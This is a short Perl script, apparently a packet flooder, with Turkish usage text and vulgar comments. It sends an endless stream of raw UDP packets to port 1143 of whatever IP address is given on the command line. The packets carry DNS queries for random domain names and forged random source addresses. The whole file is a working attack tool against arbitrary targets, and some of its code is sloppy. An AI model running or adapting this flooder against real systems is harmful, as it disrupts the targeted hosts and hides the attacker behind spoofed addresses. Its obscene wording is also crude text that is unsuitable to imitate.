#!/usr/bin/perl

use Net::DNS::Resolver;
use Net::RawIP;
use strict;

if ($ARGV[0] eq '') {
    print "Kullanim: vpn.pl <ipadresi>\n";
    exit(0);
}

print ("saldiri basladi: $ARGV[0]... hadi ananin amina\n");

my @yarrak = ("m","r",,"h","a","s","a","n");
my @alanadi = ("com", "org", "net", "com.tr", "net.tr",); # ...
my $hoppala = @yarrak[int rand(25)];
my $isim;
my $ipadresi;

for (my $i=0; $i < 256; $i++) {
    if ($i>60) { #tutfirlattimgeldimi
        $hoppala = @yarrak[int rand(9)];
        $i = 0;
    }
    $hoppala .= @yarrak[int rand(25)];
    $isim = $hoppala . "." . @alanadi[int rand(3)];
    $ipadresi = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));

    # hemen paket olusturak
    my $ananinami = new Net::DNS::Packet($isim, "A");
    my $veriler = $ananinami->data;
    my $soket = new Net::RawIP({udp=>{}});

    #paketgonderek
    $soket->set({ip => {
                saddr => $ipadresi, daddr => "$ARGV[0]", frag_off=>0,tos=>0,id=>1565},
                udp => {source => 1143,
                dest => 1143, data=>$veriler
                } });
    $soket->send;
}

exit(0);
